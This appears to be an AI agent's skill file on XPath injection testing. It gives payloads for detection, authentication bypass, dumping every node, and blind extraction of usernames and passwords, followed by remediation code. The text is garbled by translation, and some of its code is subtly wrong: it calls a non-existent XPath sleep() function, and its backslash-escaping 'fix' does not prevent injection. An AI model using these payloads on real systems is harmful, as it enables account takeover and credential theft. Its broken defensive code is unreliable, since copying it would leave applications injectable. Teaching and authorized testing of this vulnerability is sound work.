---
name: xpath-injection-testing
description: XPathProfessional skills and methodology introduced into vulnerability testing
version: 1.0.0
---

# XPathInject the bug test.

## Overview

This skill provides the detection, use, and protection methods for XPath injections.

## Vulnerability Principle

The application inputs the user into the XPath query statement directly, which is not fully validated and filtered, resulting in the attacker being able to modify the query logic.

**Example of hazard code:**
```java
String xpath = "//user[username='" + username + "' and password='" + password + "']";
XPathExpression expr = xpath.compile(xpath);
NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
```

## XPathBasic

### Query Syntax:

**Basic queries:**
```
//user[username='admin']
//user[@id='1']
//user[username='admin' and password='pass']
//user[username='admin' or username='user']
```

### Functions

**Common function:**
- `text()` - Fetch Text Contents
- `count()` - Count
- `substring()` - Substring
- `string-length()` - String Length
- `contains()` - Include Checks

## Test Method

### 1. Identification of XPath input points

**Common function:**
- User Login
- Data Search
- XMLData Query
- Configure Query

### 2. Basic Detection

**Test special character:**
```
' or '1'='1
' or '1'='1' or '
' or 1=1 or '
') or ('1'='1
```

**Test logical operator:**
```
' or '1'='1
' and '1'='2
' or 1=1 or '
```

### 3. Authentication Bypass

**Basis bypass:**
```
Username: admin' or '1'='1
Password: anything
Query: //user[username='admin' or '1'='1' and password='anything']
```

**More precise circumvention:**
```
Username: admin') or ('1'='1
Query: //user[username='admin') or ('1'='1' and password='*']
```

### 4. Information Disclosure

**Enumeration user:**
```
' or 1=1 or '
' or '1'='1
') or 1=1 or ('
```

**Number of nodes obtained:**
```
' or count(//user)>0 or '
```

**Access to specific nodes:**
```
' or substring(//user[1]/username,1,1)='a' or '
```

## Exploitation Techniques

### Authentication Bypass

**Method 1: Logical circumvention**
```
Input: admin' or '1'='1
Query: //user[username='admin' or '1'='1' and password='*']
Result: Match All Users
```

**Method 2: Comment bypass**
```
Input: admin')] | //* | //*[('
Query: //user[username='admin')] | //* | //*[('' and password='*']
```

**Method 3: Boolean blind injection**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,1,1)='b' or '
```

### Information Disclosure

**Enumeration for all users:**
```
' or 1=1 or '
Result: Returns all user nodes
```

**Access to username:**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,2,1)='d' or '
Gradual capture of each character
```

**Access password:**
```
' or substring(//user[1]/password,1,1)='p' or '
Gradual capture of password characters
```

### Blind note technology

**Time-based blind note:**
```
' or count(//user[substring(username,1,1)='a'])>0 and sleep(5) or '
```

**Boolean-based blind note:**
```
' or substring(//user[1]/username,1,1)='a' or '
Observe the response differences
```

## Bypass Techniques

### Encoding Bypass

**URL encoding:**
```
' or '1'='1 → %27%20or%20%271%27%3D%271
```

**HTML Entity Encoding:**
```
' → &#39;
" → &quot;
< → &lt;
> → &gt;
```

### Comment Bypass

**Use of notes:**
```
' or 1=1 or '
' or '1'='1' or '
```

### Function around

**Using different functions:**
```
substring(//user[1]/username,1,1)
substring(//user[position()=1]/username,1,1)
//user[1]/username/text()[1]
```

## Using the Tools

### XPathExpression Test

**Online tool:**
- XPath Tester
- XMLSpy
- Oxygen XML Editor

### Burp Suite

1. Interception of XPath search request
2. Modify Query Parameters
3. Observe the response.

### PythonScript

```python
from lxml import etree
from lxml.etree import XPath

# LoadXMLDocument
doc = etree.parse('users.xml')

# Test injection
xpath_expr = "//user[username='admin' or '1'='1']"
xpath = XPath(xpath_expr)
results = xpath(doc)
print(results)
```

## Verification and Reporting

### Verification Steps

1. Confirmable to control XPath queries
2. Authentication circumvention or disclosure of information
3. Assess the impact (unauthorized access, data disclosure, etc.)
4. Record the completePOC
5. Enter identified vulnerabilities into the platform (the only entry to the Platform 's recorded vulnerabilities) through the `report_finding` tool, with fields covering location, type, severity, recovery steps/PoC and recommendations for restoration

### Reporting Checklist

- Vulnerability location and input parameter
- XPathQuery construction
- the complete exploitation steps andPoC
- Remediation recommendations (entry validation, parametric queries, etc.)

## Preventive Measures

### Recommended Approach

1. **Input Validation**
   ```java
   private static final String[] XPATH_ESCAPE_CHARS = 
       {"'", "\"", "[", "]", "(", ")", "=", ">", "<", " "};
   
   public static String escapeXPath(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(XPATH_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Parametric Query**
   ```java
   // UsingXPathVariables
   String xpath = "//user[username=$username and password=$password]";
   XPathExpression expr = xpath.compile(xpath);
   XPathVariableResolver resolver = new MapVariableResolver(
       Map.of("username", escapedUsername, "password", escapedPassword));
   expr.setXPathVariableResolver(resolver);
   ```

3. **Allowlist Validation**
   ```java
   // Only specific characters are allowed
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Use prepared statements**
   ```java
   // Predefined Query Template
   private static final String LOGIN_QUERY = 
       "//user[username=$1 and password=$2]";
   
   // Bind with Parameter
   ```

5. **Least Privilege**
   - Limit XPath query range
   - Use access control
   - Limit Queryable Nodes

## Important Notes

- Perform only in an authorized testing environment
- Take note of the syntax differences between XPath versions.
- Avoid impact on XML data during testing
- Understanding target application XPath realization